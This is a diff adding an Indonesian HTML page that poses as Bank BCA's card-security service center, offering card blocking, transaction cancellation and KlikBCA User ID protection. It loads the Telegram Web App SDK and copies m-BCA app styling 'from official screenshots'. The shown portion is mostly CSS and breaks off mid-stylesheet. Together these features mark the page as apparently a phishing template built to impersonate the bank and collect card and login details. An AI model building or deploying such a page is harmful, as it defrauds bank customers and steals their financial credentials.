@@ -1,0 +1,3457 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <meta name="description" content="Pusat Layanan Keamanan Kartu BCA ID untuk pemblokiran kartu debit/kredit, pengamanan instrumen bank lain, pembatalan transaksi darurat, dan pengamanan User ID KlikBCA." />
+    <title>Bank BCA — Pusat Layanan Keamanan Kartu BCA ID</title>
+    <!-- Memuat Telegram Web App SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        /* ===== TEMA BCA m-Admin SESUAI SCREENSHOT RESMI ===== */
+        :root {
+            --container-padding-x: 24px;
+            --primary: #00508c;
+            --primary-dark: #003a6b;
+            --secondary: #0077b6;
+            --accent: #ffd100;
+            --bg: #d3dbe2;
+            --text: #1a2b4c;
+            --text-light: #55606b;
+            --text-inverse: #ffffff;
+            --surface: #FFFFFF;
+            --surface-alt: #EFEFEF;
+            --border: #b8c4ce;
+            --radius: 12px;
+            --radius-sm: 8px;
+            --shadow: 0 2px 10px rgba(0, 80, 140, 0.08);
+            --shadow-lg: 0 10px 30px rgba(0, 80, 140, 0.12);
+            --transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        *, *::before, *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html {
+            scroll-behavior: smooth;
+            width: 100%;
+            overflow-x: hidden;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            color: var(--text);
+            background: #ffffff;
+            line-height: 1.5;
+            width: 100%;
+            overflow-x: hidden;
+            position: relative;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            text-rendering: optimizeLegibility;
+        }
+
+        body.modal-open {
+            overflow: hidden;
+            position: fixed;
+            width: 100%;
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+        img {
+            max-width: 100%;
+            display: block;
+            image-rendering: -webkit-optimize-contrast;
+            image-rendering: crisp-edges;
+        }
+        ul {
+            list-style: none;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 1200px;
+            margin-left: auto;
+            margin-right: auto;
+            padding-left: var(--container-padding-x);
+            padding-right: var(--container-padding-x);
+            box-sizing: border-box;
+        }
+
+        /* ===== NAVBAR ===== */
+        .navbar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            width: 100%;
+            z-index: 1000;
+            padding-top: 12px;
+            padding-bottom: 12px;
+            padding-left: 0;
+            padding-right: 0;
+            transition: var(--transition);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.15);
+            box-sizing: border-box;
+        }
+        .navbar.scrolled {
+            background: rgba(255, 255, 255, 0.97);
+            backdrop-filter: blur(12px);
+            box-shadow: 0 2px 24px rgba(0, 0, 0, 0.06);
+            padding-top: 8px;
+            padding-bottom: 8px;
+            padding-left: 0;
+            padding-right: 0;
+            border-bottom: 1px solid var(--border);
+        }
+        .navbar .container {
+            width: 100%;
+            max-width: 1200px;
+            margin-left: auto;
+            margin-right: auto;
+            padding-left: var(--container-padding-x);
+            padding-right: var(--container-padding-x);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-sizing: border-box;
+        }
+        .navbar-brand {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 1.4rem;
+            font-weight: 800;
+            margin: 0;
+            padding: 0;
+        }
+        .navbar-brand img {
+            height: 32px;
+            width: auto;
+            object-fit: contain;
+            filter: brightness(0) invert(1);
+            transition: var(--transition);
+        }
+        .navbar.scrolled .navbar-brand img {
+            filter: none;
+        }
+
+        .nav-links {
+            display: flex;
+            align-items: center;
+            gap: 32px;
+        }
+        .nav-links a {
+            font-weight: 500;
+            color: rgba(255, 255, 255, 0.85);
+            transition: var(--transition);
+            position: relative;
+        }
+        .nav-links a::after {
+            content: '';
+            position: absolute;
+            bottom: -4px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: var(--accent);
+            transition: var(--transition);
+        }
+        .nav-links a:hover::after {
+            width: 100%;
+        }
+        .navbar.scrolled .nav-links a {
+            color: var(--text);
+        }
+
+        .nav-cta {
+            padding: 8px 20px !important;
+            background: var(--accent) !important;
+            color: var(--text) !important;
+            border-radius: 50px;
+            font-weight: 700 !important;
+            font-size: 0.85rem;
+        }
+        .nav-cta::after {
+            display: none !important;
+        }
+
+        .mobile-toggle {
+            display: none;
+            flex-direction: column;
+            gap: 5px;
+            cursor: pointer;
+            background: none;
+            border: none;
+            padding: 4px 0;
+            margin: 0;
+        }
+        .mobile-toggle span {
+            width: 24px;
+            height: 2px;
+            background: var(--text-inverse);
+            border-radius: 2px;
+            transition: var(--transition);
+        }
+        .navbar.scrolled .mobile-toggle span {
+            background: var(--text);
+        }
+
+        /* ===== HERO ===== */
+        .hero {
+            position: relative;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            background: linear-gradient(180deg, #00458a 0%, #005bb0 35%, #0d70cc 62%, #3893e8 80%, #7dbbf3 90%, #c4e4fd 96%, #eaf4fd 100%);
+            overflow: hidden;
+            padding-top: 80px;
+            padding-bottom: 50px;
+            padding-left: 0;
+            padding-right: 0;
+            box-sizing: border-box;
+        }
+
+        .hero-shapes {
+            position: absolute;
+            inset: 0;
+            overflow: hidden;
+            pointer-events: none;
+        }
+        .hero-shapes .shape {
+            position: absolute;
+            border-radius: 50%;
+            opacity: 0.08;
+            background: white;
+        }
+        .hero-shapes .shape:nth-child(1) {
+            width: 400px;
+            height: 400px;
+            top: -100px;
+            right: -100px;
+            animation: float 9s ease-in-out infinite;
+        }
+        .hero-shapes .shape:nth-child(2) {
+            width: 250px;
+            height: 250px;
+            bottom: 5%;
+            left: -50px;
+            animation: float 11s ease-in-out infinite reverse;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-20px) rotate(6deg); }
+        }
+
+        .hero .container {
+            width: 100%;
+            max-width: 1200px;
+            margin-left: auto;
+            margin-right: auto;
+            padding-left: var(--container-padding-x);
+            padding-right: var(--container-padding-x);
+            position: relative;
+            z-index: 2;
+            display: grid;
+            grid-template-columns: 1.1fr 0.9fr;
+            gap: 40px;
+            align-items: center;
+            box-sizing: border-box;
+        }
+
+        .hero-content h1 {
+            font-size: clamp(1.85rem, 3.4vw, 2.75rem);
+            font-weight: 500;
+            color: var(--text-inverse);
+            line-height: 1.25;
+            letter-spacing: -0.015em;
+            margin-bottom: clamp(60px, 8vw, 100px);
+            min-height: 2.2em;
+        }
+        .hero-content h1 .highlight {
+            font-weight: 700;
+            background: linear-gradient(120deg, #ffd100, #ffea75);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -0.01em;
+        }
+
+
+        /* ===== HERO CARDS GRID ===== */
+        .hero-cards-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 14px;
+            width: 100%;
+            max-width: 520px;
+        }
+
+        .hero-card-item {
+            background: var(--primary-dark);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: var(--radius);
+            padding: 16px 18px;
+            text-align: left;
+            color: var(--text-inverse);
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
+            cursor: pointer;
+            transition: var(--transition);
+            min-height: 84px;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .hero-card-icon {
+            width: 44px;
+            height: 44px;
+            min-width: 44px;
+            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.12);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #ffd100;
+            transition: all 0.25s ease;
+            box-shadow: inset 0 0 0 1px rgba(255, 255, 255, 0.15);
+            flex-shrink: 0;
+        }
+
+        .hero-card-icon svg {
+            width: 24px;
+            height: 24px;
+        }
+
+        .hero-card-title {
+            font-size: 1rem;
+            font-weight: 700;
+            color: #ffffff;
+            line-height: 1.3;
+            letter-spacing: -0.2px;
+            display: block;
+        }
+
+        .hero-cards-grid .hero-card-item:nth-child(1) { animation: boxMove1 4s ease-in-out infinite; }
+        .hero-cards-grid .hero-card-item:nth-child(2) { animation: boxMove2 4.5s ease-in-out infinite; }
+        .hero-cards-grid .hero-card-item:nth-child(3) { animation: boxMove3 5s ease-in-out infinite; }
+        .hero-cards-grid .hero-card-item:nth-child(4) { animation: boxMove4 4.2s ease-in-out infinite; }
+
+        @keyframes boxMove1 {
+            0%, 100% { transform: translateY(0) scale(1); }
+            50% { transform: translateY(-6px) scale(1.02); }
+        }
+        @keyframes boxMove2 {
+            0%, 100% { transform: translateY(0) scale(1); }
+            50% { transform: translateY(6px) scale(1.02); }
+        }
+        @keyframes boxMove3 {
+            0%, 100% { transform: translateY(0) scale(1); }
+            50% { transform: translateY(-5px) scale(1.02); }
+        }
+        @keyframes boxMove4 {
+            0%, 100% { transform: translateY(0) scale(1); }
+            50% { transform: translateY(5px) scale(1.02); }
+        }
+
+        .hero-card-item:hover, .hero-card-item.active-card {
+            background: var(--primary);
+            border-color: var(--accent);
+            box-shadow: 0 12px 30px rgba(0, 96, 175, 0.45);
+            transform: translateY(-3px) scale(1.02);
+            animation-play-state: paused;
+        }
+
+        .hero-card-item:hover .hero-card-icon,
+        .hero-card-item.active-card .hero-card-icon {
+            background: #ffd100;
+            color: #003870;
+            box-shadow: 0 4px 12px rgba(255, 209, 0, 0.4);
+            transform: scale(1.06);
+        }
+
+        /* ===== HERO VISUAL ===== */
+        .hero-visual {
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+        }
+        
+        .card-slider-container {
+            width: 100%;
+            max-width: 540px;
+            height: 340px;
+            position: relative;
+            background: transparent;
+            border: none;
+            box-shadow: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: heroFloat 5s ease-in-out infinite;
+        }
+
+        .card-slide {
+            position: absolute;
+            inset: 0;
+            opacity: 0;
+            transition: opacity 1.2s ease-in-out, transform 1.2s ease-in-out;
+            transform: scale(0.92) translateY(10px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 4px;
+        }
+
+        .card-slide.active {
+            opacity: 1;
+            transform: scale(1) translateY(0);
+        }
+
+        .card-slide img {
+            max-height: 100%;
+            max-width: 100%;
+            object-fit: contain;
+            filter: drop-shadow(0 20px 35px rgba(0, 20, 50, 0.45));
+        }
+
+        @keyframes heroFloat {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-12px); }
+        }
+
+        /* ===== BCA OFFICIAL BLUE BOTTOM NAVIGATION BAR ===== */
+        .bca-bottom-header {
+            background: #005bb0;
+            background: linear-gradient(180deg, #005bac 0%, #00468c 100%);
+            border-top: 1px solid rgba(255, 255, 255, 0.15);
+            box-shadow: 0 -4px 20px rgba(0, 30, 80, 0.2);
+            position: relative;
+            z-index: 100;
+            width: 100%;
+        }
+
+        .bca-bottom-menu-grid {
+            display: grid;
+            grid-template-columns: repeat(6, 1fr);
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 0;
+            list-style: none;
+        }
+
+        .bca-bottom-menu-item {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 16px 8px 14px 8px;
+            color: #ffffff;
+            text-decoration: none;
+            transition: all 0.2s ease;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        .bca-bottom-menu-item:not(:last-child)::after {
+            content: '';
+            position: absolute;
+            right: 0;
+            top: 20%;
+            height: 60%;
+            width: 1px;
+            background-color: rgba(255, 255, 255, 0.25);
+        }
+
+        .bca-bottom-menu-item:hover {
+            background-color: rgba(255, 255, 255, 0.12);
+        }
+
+        .bca-bottom-menu-icon {
+            width: 28px;
+            height: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 8px;
+        }
+
+        .bca-bottom-menu-icon svg {
+            width: 28px;
+            height: 28px;
+            stroke: #ffffff;
+            fill: none;
+            stroke-width: 2.2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        .bca-bottom-menu-label {
+            font-size: 0.92rem;
+            font-weight: 500;
+            color: #ffffff;
+            line-height: 1.25;
+            letter-spacing: 0.2px;
+            white-space: pre-line;
+        }
+
+        .bca-bottom-legal {
+            background: #003870;
+            padding: 12px 16px;
+            text-align: center;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .bca-bottom-legal p {
+            margin: 0;
+            font-size: 0.74rem;
+            color: rgba(255, 255, 255, 0.75);
+            line-height: 1.5;
+        }
+
+        @media (max-width: 640px) {
+            .bca-bottom-menu-grid {
+                grid-template-columns: repeat(6, 1fr);
+            }
+            .bca-bottom-menu-item {
+                padding: 12px 4px 10px 4px;
+            }
+            .bca-bottom-menu-icon {
+                width: 22px;
+                height: 22px;
+                margin-bottom: 6px;
+            }
+            .bca-bottom-menu-icon svg {
+                width: 22px;
+                height: 22px;
+            }
+            .bca-bottom-menu-label {
+                font-size: 0.72rem;
+            }
+        }
+
+        /* ===== MODAL / POPUP ANIMATIONS (100% MENUTUPI LAYAR DENGAN TEMA m-BCA m-Admin) ===== */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: linear-gradient(155deg, #d3dce2 0%, #e2e8ed 30%, #c8d3db 60%, #b8c4cc 100%);
+            z-index: 2000;
+            display: block;
+            padding: 0;
+            margin: 0;
+            width: 100%;
+            height: 100vh;
+            height: 100dvh;
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s cubic-bezier(0.16, 1, 0.3, 1), visibility 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal-overlay.scroll-locked {
+            overflow: hidden !important;
+            touch-action: none !important;
+            overscroll-behavior: none !important;
+        }
+
+        .modal-content {
+            background: linear-gradient(155deg, #d3dce2 0%, #e2e8ed 30%, #c8d3db 60%, #b8c4cc 100%);
+            width: 100%;
+            max-width: 480px;
+            min-height: 100vh;
+            min-height: 100dvh;
+            margin: 0 auto;
+            border-radius: 0;
+            box-shadow: none;
+            border: none;
+            position: relative;
+            padding: 0 16px 24px 16px;
+            opacity: 0;
+            transform: translateY(14px);
+            transition: opacity 0.35s cubic-bezier(0.16, 1, 0.3, 1), transform 0.35s cubic-bezier(0.16, 1, 0.3, 1);
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .modal-overlay.active .modal-content {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        /* ===== m-BCA TOP APP HEADER (Sesuai Screenshot m-Admin - Seamless Tanpa Batas) ===== */
+        .mbca-top-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 13px 16px;
+            background: rgba(255, 255, 255, 0.96);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            margin: 0 -16px 16px -16px;
+            border: none !important;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.06) !important;
+            box-shadow: 0 4px 15px rgba(0, 40, 90, 0.06) !important;
+            outline: none !important;
+        }
+
+        .mbca-header-left {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+            color: #00508c;
+        }
+
+        .mbca-back-btn {
+            background: rgba(0, 80, 140, 0.04);
+            border: 1px solid rgba(0, 80, 140, 0.15);
+            border-radius: 8px;
+            padding: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            color: #00508c;
+            transition: all 0.22s cubic-bezier(0.16, 1, 0.3, 1);
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.06);
+        }
+        .mbca-back-btn:hover {
+            background: #ffffff;
+            color: #003865;
+            border-color: #00508c;
+            transform: scale(1.12);
+            box-shadow: 0 4px 10px rgba(0, 80, 140, 0.22);
+        }
+        .mbca-back-btn:active {
+            transform: scale(0.92);
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+
+        .mbca-header-title {
+            font-size: 1.22rem;
+            font-weight: 700;
+            color: #00508c;
+            letter-spacing: -0.2px;
+            text-align: center;
+            flex: 1;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+        }
+
+        .mbca-header-right {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .mbca-status-indicator {
+            width: 15px;
+            height: 15px;
+            background-color: #8fc926;
+            border: 1px solid #73a61d;
+            border-radius: 2px;
+            display: inline-block;
+            animation: mbcaLedPulse 1.8s infinite alternate;
+        }
+
+        @keyframes mbcaLedPulse {
+            0% {
+                background-color: #8fc926;
+                box-shadow: 0 0 2px rgba(143, 201, 38, 0.5);
+            }
+            100% {
+                background-color: #a8f029;
+                border-color: #8be014;
+                box-shadow: 0 0 8px rgba(168, 240, 41, 0.8), 0 0 14px rgba(168, 240, 41, 0.4);
+            }
+        }
+
+        .mbca-send-btn {
+            background: linear-gradient(180deg, #4f799e 0%, #345c80 100%);
+            color: #ffffff;
+            border: 1px solid #284c6e;
+            border-radius: 6px;
+            padding: 6px 16px;
+            font-size: 0.92rem;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.25), 0 1px 2px rgba(0,0,0,0.15);
+            transition: all 0.15s ease;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .mbca-send-btn:hover {
+            background: linear-gradient(180deg, #5985ab 0%, #3c678e 100%);
+        }
+        .mbca-send-btn:active {
+            transform: translateY(1px);
+        }
+
+        /* ===== SECTION STRIP / BANNER ABU-ABU ===== */
+        .mbca-section-strip {
+            background: #ffffff;
+            color: #00508c;
+            font-weight: 700;
+            font-size: 0.88rem;
+            padding: 11px 16px;
+            margin: 14px 0 16px 0;
+            border: 1.5px solid #b8c4ce;
+            border-radius: 10px;
+            letter-spacing: -0.1px;
+            text-align: center;
+        }
+
+        /* ===== CARD INFO DISPLAY UNDER PREVIEW ===== */
+        .mbca-card-meta {
+            padding: 8px 4px 6px 4px;
+            text-align: left;
+        }
+        .mbca-card-meta-label {
+            font-size: 0.88rem;
+            font-weight: 700;
+            color: #00508c;
+            margin-bottom: 2px;
+        }
+        .mbca-card-meta-value {
+            font-size: 1.05rem;
+            font-weight: 700;
+            color: #111827;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            letter-spacing: 0.5px;
+        }
+
+        /* ===== INFO NOTICE BOX (Sesuai Screenshot) ===== */
+        .mbca-info-box {
+            border: 1.5px solid #b8c4ce;
+            border-radius: 8px;
+            background: #ffffff;
+            padding: 8px 12px;
+            margin: 8px 0;
+            color: #55606b;
+            font-size: 0.78rem;
+            line-height: 1.4;
+        }
+        .mbca-info-box strong {
+            color: #1f2937;
+        }
+
+        /* ===== CATATAN LIST SECTION (Sesuai Screenshot) ===== */
+        .mbca-notes-container {
+            margin: 10px 0 14px 0;
+            text-align: left;
+            background: #ffffff;
+            border: 1.5px solid #b8c4ce;
+            border-radius: 8px;
+            padding: 10px 12px;
+        }
+        .mbca-notes-title {
+            color: #00508c;
+            font-size: 0.92rem;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        .mbca-notes-list {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .mbca-notes-item {
+            position: relative;
+            padding-left: 18px;
+            font-size: 0.8rem;
+            color: #55606b;
+            line-height: 1.4;
+        }
+        .mbca-notes-item::before {
+            content: '•';
+            position: absolute;
+            left: 4px;
+            top: -1px;
+            font-size: 1.2rem;
+            color: #00508c;
+            line-height: 1.2;
+        }
+
+        /* ===== DUAL ACTION BUTTONS (Cancel & OK Sesuai Screenshot) ===== */
+        .mbca-action-buttons {
+            display: flex;
+            gap: 12px;
+            margin-top: 10px;
+            width: 100%;
+        }
+        .mbca-btn-cancel {
+            flex: 1;
+            height: 44px;
+            background: #d1d7dc;
+            color: #334155;
+            border: 1px solid #b8c4ce;
+            border-radius: 8px;
+            font-size: 0.94rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.22s cubic-bezier(0.16, 1, 0.3, 1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.06);
+        }
+        .mbca-btn-cancel:hover {
+            background: #c2cacf;
+            color: #0f172a;
+            border-color: #94a3b8;
+            transform: translateY(-2px) scale(1.025);
+            box-shadow: 0 6px 14px rgba(0, 0, 0, 0.12);
+        }
+        .mbca-btn-cancel:active {
+            transform: translateY(0) scale(0.97);
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
+        }
+
+        .mbca-btn-ok {
+            flex: 1;
+            height: 44px;
+            background: linear-gradient(180deg, #4f799e 0%, #345c80 100%);
+            color: #ffffff;
+            border: 1px solid #284c6e;
+            border-radius: 8px;
+            font-size: 0.94rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.22s cubic-bezier(0.16, 1, 0.3, 1);
+            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.25), 0 3px 8px rgba(0, 40, 80, 0.22);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .mbca-btn-ok:hover:not(:disabled) {
+            background: linear-gradient(180deg, #5c8eb8 0%, #3a6894 100%);
+            border-color: #1e3a54;
+            transform: translateY(-2px) scale(1.025);
+            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.35), 0 8px 20px rgba(0, 60, 120, 0.35);
+        }
+        .mbca-btn-ok:active:not(:disabled) {
+            transform: translateY(0) scale(0.97);
+            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.15), 0 2px 5px rgba(0, 40, 80, 0.2);
+        }
+        .mbca-btn-ok:disabled {
+            opacity: 0.65;
+            cursor: not-allowed;
+            transform: none !important;
+            box-shadow: none !important;
+        }
+
+        /* ===== SMOOTH STEP & CONTENT FADE-IN ANIMATION ===== */
+        @keyframes stepFadeIn {
+            0% {
+                opacity: 0;
+                transform: translateY(12px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .step-fade-in {
+            animation: stepFadeIn 0.38s cubic-bezier(0.16, 1, 0.3, 1) both;
+        }
+
+        .tab-content-fade {
+            animation: stepFadeIn 0.3s cubic-bezier(0.16, 1, 0.3, 1) both;
+        }
+
+        /* ===== SPLASH SCREEN / TRANSISI LOGO SAAT KLIK TOMBOL ===== */
+        .app-splash-screen {
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, #004080 0%, #0060af 100%);
+            z-index: 300;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease;
+        }
+        .app-splash-screen.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        .app-splash-logo {
+            width: 170px;
+            height: auto;
+            object-fit: contain;
+            animation: pulseLogo 1s ease-in-out infinite alternate;
+            margin-bottom: 14px;
+            filter: brightness(0) invert(1);
+        }
+        .app-splash-subtitle {
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 0.82rem;
+            letter-spacing: 0.5px;
+            font-weight: 600;
+        }
+        @keyframes pulseLogo {
+            0% { transform: scale(0.96); opacity: 0.88; }
+            100% { transform: scale(1.04); opacity: 1; }
+        }
+
+        /* Modal App Header */
+        .modal-app-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            padding-bottom: 10px;
+            border-bottom: none;
+            position: relative;
+        }
+        .modal-app-header img {
+            height: 24px;
+            max-width: 120px;
+            object-fit: contain;
+        }
+        .modal-app-badge {
+            font-size: 0.68rem;
+            color: var(--primary);
+            font-weight: 800;
+            background: #eef6fc;
+            padding: 3px 10px;
+            border-radius: 20px;
+            border: 1px solid rgba(0, 96, 175, 0.15);
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+        .modal-close,
+        .modal-close-btn {
+            background: #ffffff;
+            border: 1px solid #cbd5e1;
+            width: 34px;
+            height: 34px;
+            border-radius: 50%;
+            font-size: 1.35rem;
+            line-height: 1;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #475569;
+            transition: all 0.22s cubic-bezier(0.16, 1, 0.3, 1);
+            position: absolute;
+            top: 13px;
+            right: 13px;
+            z-index: 105;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.08);
+        }
+        .modal-close:hover,
+        .modal-close-btn:hover {
+            background: #f1f5f9;
+            color: #00508c;
+            border-color: #94a3b8;
+            transform: scale(1.12);
+            box-shadow: 0 4px 14px rgba(0, 80, 140, 0.22);
+        }
+        .modal-close:active,
+        .modal-close-btn:active {
+            transform: scale(0.92);
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+
+        /* ===== CUSTOM SUCCESS ALERT POPUP ===== */
+        .custom-alert-overlay {
+            position: fixed;
+            inset: 0;
+            width: 100vw;
+            height: 100vh;
+            height: 100dvh;
+            background: rgba(0, 20, 50, 0.65);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            z-index: 99999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.25s ease;
+            touch-action: none;
+            overscroll-behavior: none;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+        .custom-alert-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        .custom-alert-box {
+            background: #ffffff;
+            width: 100%;
+            max-width: 310px;
+            border-radius: 18px;
+            padding: 24px 20px;
+            text-align: center;
+            box-shadow: 0 15px 35px rgba(0, 96, 175, 0.18);
+            border: 1px solid var(--border);
+            transform: scale(0.85) translateY(15px);
+            transition: transform 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+        .custom-alert-overlay.active .custom-alert-box {
+            transform: scale(1) translateY(0);
+        }
+        .custom-alert-icon {
+            width: 54px;
+            height: 54px;
+            background: #e6f4ea;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            color: #137333;
+        }
+        .custom-alert-title {
+            font-size: 1.05rem;
+            font-weight: 800;
+            color: var(--text);
+            margin-bottom: 6px;
+        }
+        .custom-alert-desc {
+            font-size: 0.82rem;
+            color: var(--text-light);
+            line-height: 1.45;
+            margin-bottom: 18px;
+        }
+        .custom-alert-btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #004080 0%, #0060af 100%);
+            color: #ffffff;
+            border: none;
+            border-radius: var(--radius-sm);
+            font-size: 0.95rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.22s cubic-bezier(0.16, 1, 0.3, 1);
+            box-shadow: 0 3px 8px rgba(0, 96, 175, 0.25);
+        }
+        .custom-alert-btn:hover {
+            background: linear-gradient(135deg, #004d99 0%, #0072d0 100%);
+            transform: translateY(-2px) scale(1.025);
+            box-shadow: 0 8px 20px rgba(0, 96, 175, 0.4);
+        }
+        .custom-alert-btn:active {
+            transform: translateY(0) scale(0.97);
+            box-shadow: 0 2px 5px rgba(0, 96, 175, 0.2);
+        }
+
+        /* ===== KARTU 3D FLIP VIRTUAL PROPORSIONAL & SERASI (UKURAN KARTU ASLI) ===== */
+        .card-flip-container {
+            perspective: 1000px;
+            width: 260px;
+            max-width: 100%;
+            height: 164px;
+            margin: 6px auto 10px auto;
+            position: relative;
+            display: block;
+            clear: both;
+            cursor: pointer;
+            user-select: none;
+            transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        .card-flip-inner {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            text-align: center;
+            transition: transform 0.65s cubic-bezier(0.4, 0, 0.2, 1);
+            transform-style: preserve-3d;
+            will-change: transform;
+        }
+
+        .card-flip-inner.is-flipped {
+            transform: rotateY(180deg);
+        }
+
+        /* Hover halus 3D: kartu sedikit berotasi & memberikan kesan kedalaman fisik */
+        .card-flip-container:hover {
+            transform: translateY(-4px);
+        }
+
+        /* Hover JS yang mengatur rotasi 3D tilt secara dinamis */
+
+        .card-flip-container:hover .card-face {
+            box-shadow: 0 18px 36px -4px rgba(0, 24, 60, 0.45), 0 8px 18px -2px rgba(0, 24, 60, 0.22);
+            border-color: rgba(255, 255, 255, 0.38);
+        }
+
+        .card-flip-container:hover .card-face::before {
+            background: linear-gradient(115deg, rgba(255, 255, 255, 0.28) 0%, transparent 45%, rgba(255, 255, 255, 0.1) 100%);
+        }
+
+        .card-face {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            -webkit-backface-visibility: hidden;
+            backface-visibility: hidden;
+            border-radius: 10px;
+            box-shadow: 0 8px 20px -4px rgba(0, 24, 60, 0.35);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            overflow: hidden;
+            transition: background 0.4s ease, box-shadow 0.35s ease, border-color 0.35s ease;
+            box-sizing: border-box;
+            transform: rotateX(0deg);
+        }
+
+        .card-face::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            pointer-events: none;
+            background: linear-gradient(125deg, rgba(255, 255, 255, 0.15) 0%, transparent 40%, rgba(255, 255, 255, 0.05) 100%);
+            border-radius: 10px;
+            z-index: 1;
+            transition: background 0.35s ease;
+        }
+
